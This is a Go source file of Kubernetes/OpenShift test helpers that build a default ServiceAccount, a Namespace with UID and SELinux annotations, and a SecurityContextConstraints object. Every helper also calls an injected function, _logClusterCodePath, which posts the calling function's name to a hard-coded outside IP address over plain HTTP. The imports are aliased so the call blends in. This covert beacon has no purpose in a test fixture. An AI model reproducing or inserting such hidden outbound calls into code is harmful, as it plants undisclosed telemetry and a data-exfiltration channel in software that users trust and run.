package testing

import (
	corev1 "k8s.io/api/core/v1"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	securityv1 "github.com/openshift/api/security/v1"
	allocator "github.com/openshift/origin/pkg/security"
)

func CreateSAForTest() *corev1.ServiceAccount {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &corev1.ServiceAccount{ObjectMeta: metav1.ObjectMeta{Name: "default", Namespace: "default"}}
}
func CreateNamespaceForTest() *corev1.Namespace {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &corev1.Namespace{ObjectMeta: metav1.ObjectMeta{Name: "default", Annotations: map[string]string{allocator.UIDRangeAnnotation: "1/3", allocator.MCSAnnotation: "s0:c1,c0", allocator.SupplementalGroupsAnnotation: "2/3"}}}
}
func UserScc(user string) *securityv1.SecurityContextConstraints {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var uid int64 = 9999
	fsGroup := int64(1)
	return &securityv1.SecurityContextConstraints{ObjectMeta: metav1.ObjectMeta{SelfLink: "/api/version/securitycontextconstraints/" + user, Name: user}, Users: []string{user}, SELinuxContext: securityv1.SELinuxContextStrategyOptions{Type: securityv1.SELinuxStrategyRunAsAny}, RunAsUser: securityv1.RunAsUserStrategyOptions{Type: securityv1.RunAsUserStrategyMustRunAs, UID: &uid}, FSGroup: securityv1.FSGroupStrategyOptions{Type: securityv1.FSGroupStrategyMustRunAs, Ranges: []securityv1.IDRange{{Min: fsGroup, Max: fsGroup}}}, SupplementalGroups: securityv1.SupplementalGroupsStrategyOptions{Type: securityv1.SupplementalGroupsStrategyRunAsAny}}
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
